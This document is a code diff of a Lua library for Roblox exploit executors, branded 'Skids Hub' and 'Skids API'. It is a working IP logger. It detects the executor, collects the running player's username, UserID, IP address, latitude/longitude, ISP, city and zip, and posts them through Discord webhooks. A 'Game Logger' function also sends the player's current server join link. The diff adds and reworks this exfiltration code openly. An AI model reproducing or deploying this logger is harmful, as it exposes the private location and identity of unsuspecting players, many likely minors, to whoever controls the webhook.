@@ -4,12 +4,13 @@ do
         
         local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname())
 
+        exploitName = exploitName or 'I don\'t fucking know'
 
         return exploitName
 
     end
 
-    skidApi = {
+    local skidApi = {
         webhookJson = function(self, scriptName)
 
             if not self then return end
@@ -17,65 +18,40 @@ do
             local player = game.Players.LocalPlayer
             local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
             local ipData = self.ipApi
+       
+       
             scriptName = scriptName or 'Viva Mexico'
+       
+       
             return {
-                content = string.format('**@%s** __fired__ **%s**', player.Name, scriptName),
-                embeds  = {
-                    { 
-                        author={
-                                name='Skids Hub/ramirez',
-                                url='https://discord.gg/q8FspVseAU',
-                                icon_url='https://sweetiefoxislife.000webhostapp.com/media/slutshub.png'
-                        },
-                        title='Skids Hub **IP LOGGER**',
-                        url='https://discord.gg/q8FspVseAU',
-                        description = string.format('@%s**(%s)[%d]** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, game.Players.LocalPlayer.UserId ,scriptName),
-                        color = 0x080808,
-                        fields  = {
+                ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName,
+                ["embeds"] = {
+                        {
+                        ["title"] = "Skids API",
+                        ["description"] = "__a library made for skids :wink:__",
+                        ["url"] = "https://discord.gg/EUaH265S",
+                        ["color"] = 526344,
+                        ["fields"] = {
                             {
-                                name = '**Country**',
-                                value = ipData['country'] .. '/' .. ipData['countryCode'],
-                                inline = true
+                            ["name"] = "User Data",
+                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername:%s\nDisplayName:%s\nUserID:%d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                             },
                             {
-                                name = '**Region**',
-                                value = ipData['regionName'] .. '/' .. ipData['region'],
-                                inline = true
-                            },
-                            {
-                                name = '**City/Zip**',
-                                value = ipData['city'] .. '/' .. ipData['zip'],
-                                inline = true
+                            ["name"] = "More Info",
+                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*Isp/Org*: %s\n*Exploit: %s*\n*Country/Region:%s/%s*\n*zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
-                        thumbnail = {
-                            url = playerThumb
-                        }
-                    },
-                    {
-                        color = 0x080808,
-                        fields={
-                            {
-                                name = '**lat/lon**',
-                                value = ipData['lat'] .. '/' .. ipData['lon'],
-                                inline = true
-                            },
-                            {
-                                name = '**Isp/Org**',
-                                value = ipData['isp'] .. '/' .. ipData['org'],
-                                inline = true
-                            },
-                            {
-                                name = '**IPV4/IPV6**',
-                                value = ipData['query'],
-                                inline = false
-                            },
+                        ["author"] = {
+                            ["name"] = "Skids Hub/ramirez",
+                            ["url"] = "https://discord.gg/EUaH265S",
+                            ["icon_url"] = "https://sweetiefoxislife.000webhostapp.com/media/slutshub.png"
                         },
-                        footer = {
-                            text = 'Skids Hub',
-                            icon_url='https://sweetiefoxislife.000webhostapp.com/media/slutshub.png'
+                        ["footer"] = {
+                            ["text"] = "Skids Hub/ramirez",
+                            ["icon_url"] = "https://sweetiefoxislife.000webhostapp.com/media/slutshub.png"
+                        },
+                        ["timestamp"] = os.date('%Y-%m-%dT%H:%M:%S.%M%SZ')
                         }
-                    }
                 }
             }
         end,
@@ -86,6 +62,7 @@ do
         httpPost = (Krnl and request) or (syn and syn.request) or http_request or (http and http.request),
         
         sendWebhook = function(self,webhooklink, ...)
+            print('rekt')
             if self and webhooklink and self.httpPost and self.webhookJson then
 
                 if type(self.webhookJson) == "function" then
@@ -100,7 +77,6 @@ do
                     }
                 )
                 end
-
                 return self.httpPost(
                     {
                         Url = webhooklink,
@@ -115,33 +91,44 @@ do
         end,
         sendWebhookGame = function(self,webhooklink, scriptName)
 
-            scriptName = scriptName or 'Viva Mexico!'
+            if not self then return end
 
+            scriptName = scriptName or 'Viva Mexico!'
+            local player = game.Players.LocalPlayer
             local gameThumb = string.format('https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png',game.PlaceId)
 
             local webhookJson = {
-                content = string.format('**@%s(%d)** __fired__ **%s**', game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId ,scriptName),
-                embeds = {
+
+            ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName ,
+            ["embeds"] = {
+                {
+                ["title"] = "Skids API",
+                ["description"] = "__a library made for skids :wink:__",
+                ["url"] = "https://discord.gg/EUaH265S",
+                ["color"] = 526344,
+                ["fields"] = {
                     {
-                        author={
-                            name='Skids Hub/ramirez',
-                            url='https://discord.gg/q8FspVseAU',
-                            icon_url='https://sweetiefoxislife.000webhostapp.com/media/slutshub.png'
-                        },
-                        title='Skids Hub **Game Logger**',
-                        color = 0x080808,
-                        url='https://discord.gg/q8FspVseAU',
-                        description = string.format('@%s**(%s)** is playing [game](https://www.roblox.com/games/%d) ||Roblox.GameLauncher.joinGameInstance(%d, "%s")|| ', game.Players.LocalPlayer.Name, game.Players.LocalPlayer.DisplayName,game.PlaceId, game.PlaceId, game.JobId),
-                        thumbnail={
-                            url=gameThumb
-                        },
-                        footer = {
-                            text = 'Skids Hub',
-                            icon_url='https://sweetiefoxislife.000webhostapp.com/media/slutshub.png'
-                        }
+                    ["name"] = "User Data",
+                    ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
                     }
+                },
+                ["author"] = {
+                    ["name"] = "Skids Hub/ramirez",
+                    ["url"] = "https://discord.gg/EUaH265S",
+                    ["icon_url"] = "https://sweetiefoxislife.000webhostapp.com/media/slutshub.png"
+                },
+                ["footer"] = {
+                    ["text"] = "Skids Hub/ramirez",
+                    ["icon_url"] = "https://sweetiefoxislife.000webhostapp.com/media/slutshub.png"
+                },
+                ["thumbnail"] = {
+                    ["url"] = gameThumb
+                  },
+                  ["timestamp"] = os.date('%Y-%m-%dT%H:%M:%S.%M%SZ')
                 }
             }
+            }
+
             self.httpPost(
                 {
                     Url = webhooklink,
@@ -156,6 +143,10 @@ do
 
     }
 
+    -- skidApi:sendWebhook('', 'Test1')
+    -- skidApi:sendWebhookGame('', 'test 1')
+
+    return skidApi
 end
 
 
@@ -165,4 +156,3 @@ end
 
 
 
-return skidApi
